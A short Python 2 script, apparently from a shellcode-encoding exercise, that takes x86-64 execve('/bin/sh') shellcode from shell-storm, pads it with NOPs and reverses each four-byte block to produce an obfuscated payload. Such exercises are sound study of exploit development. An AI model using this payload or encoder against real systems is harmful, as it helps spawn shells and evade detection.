#Shellcode used for this example is taken from: http://shell-storm.org/shellcode/files/shellcode-806.php
import binascii

j = 3
i = 0
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellarray = bytearray(shellcode)
length = len(shellarray)
encoded = []

encoded_shellcode = shellcode.encode('hex')
input = "Input:"+ r"\x" + r"\x".join(encoded_shellcode[n:n+2] for n in range(0, len(encoded_shellcode),2))
print input

#print "Old length: %s" % length

if (length%4 != 0):
	adding = 4 -(length%4)
	for i in range (adding):
		shellarray.append(0x90)

#print "New length with \\x90-s appended: %s" % len(shellarray)

#changing positions
while(j <= len(shellarray)):
	for i in range(4):
		encoded.append(shellarray[j-i])
	j = j + 4

output = binascii.hexlify(bytearray(encoded))
result = "Output" + r"\x" + r"\x".join(output[n : n+2] for n in range(0, len(output), 2))
print result
